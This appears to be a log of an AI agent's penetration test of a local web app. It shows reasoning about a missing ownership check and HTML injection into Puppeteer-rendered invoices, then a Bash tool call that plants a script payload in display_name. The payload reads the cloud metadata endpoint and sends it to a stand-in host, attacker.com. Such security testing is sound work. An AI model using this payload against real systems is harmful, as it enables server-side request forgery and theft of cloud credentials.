{"type":"llm_response","timestamp":"2026-04-08T08:32:51.316Z","data":{"turn":345,"content":"{\"type\":\"thinking\",\"thinking\":\"No ownership check in `generateInvoice` either! Any authenticated user can request the invoice for any contract. Combined with the HTML injection in `display_name` and `milestone.title`, this is a significant vulnerability.\\n\\nNow let me confirm the Puppeteer injection is exploitable. The key path:\\n1. Register as a client with `display_name` containing HTML injection payload\\n2. Get a contract ID (or enumerate any contract)\\n3. Call `GET /api/contracts/:id/invoice`\\n4. Puppeteer renders the HTML with the injected payload\\n\\nLet me test this quickly. I'll:\\n1. Update the `display_name` of `xsstest2@test.com` to include an HTML injection\\n\\n\\n2. Find or create a contract where xsstest2 is the client\\n3. Request the invoice and verify the injection works\\n\\nActually, let me check if there are existing contracts in the system first, then update xsstest2's display_name with the payload and test against those. But this is getting complicated—let me explore the SSRF angle instead.\\n\\nIf I inject a script tag into the display_name, Puppeteer would execute it when rendering the PDF, and with `waitUntil: 'networkidle0'` the server would wait for all network requests to complete, making this a viable SSRF vector. This falls under Server-Side Template Injection via headless browser, with impacts including PDF manipulation, SSRF from the server, and potential data exfiltration. Now let me check the profile update endpoint to test changing the display_name.\",\"signature\":\"\"}","timestamp":"2026-04-08T08:32:51.316Z"}}
{"type":"llm_response","timestamp":"2026-04-08T08:32:53.820Z","data":{"turn":346,"content":"{\"type\":\"tool_use\",\"id\":\"toolu_016r43d2aG1dXhafaepDBqsN\",\"name\":\"Bash\",\"input\":{\"command\":\"CLIENT_TOKEN=$(curl -s -X POST \\\"http://host.docker.internal:3000/api/auth/login\\\" \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\\"email\\\":\\\"xsstest2@test.com\\\",\\\"password\\\":\\\"password123\\\"}' | python3 -c \\\"import sys,json; d=json.load(sys.stdin); print(d.get('token',''))\\\")\\nCLIENT_ID=$(curl -s -X POST \\\"http://host.docker.internal:3000/api/auth/login\\\" \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\\"email\\\":\\\"xsstest2@test.com\\\",\\\"password\\\":\\\"password123\\\"}' | python3 -c \\\"import sys,json; d=json.load(sys.stdin); print(d['user']['id'])\\\")\\n\\n# Try to update display_name with HTML injection payload\\nUPDATE_RESP=$(curl -s -X PUT \\\"http://host.docker.internal:3000/api/users/profile\\\" \\\\\\n  -H \\\"Authorization: Bearer $CLIENT_TOKEN\\\" \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\\"display_name\\\":\\\"<script>fetch(\\\\\\\"http://169.254.169.254/latest/meta-data/\\\\\\\").then(r=>r.text()).then(d=>fetch(\\\\\\\"http://attacker.com/?data=\\\\\\\"+btoa(d)))</script>\\\",\\\"bio\\\":\\\"normal bio\\\"}')\\necho \\\"Update: $UPDATE_RESP\\\" | head -c 300\",\"description\":\"Test HTML injection in display_name via profile update\"},\"caller\":{\"type\":\"direct\"}}","timestamp":"2026-04-08T08:32:53.820Z"}}
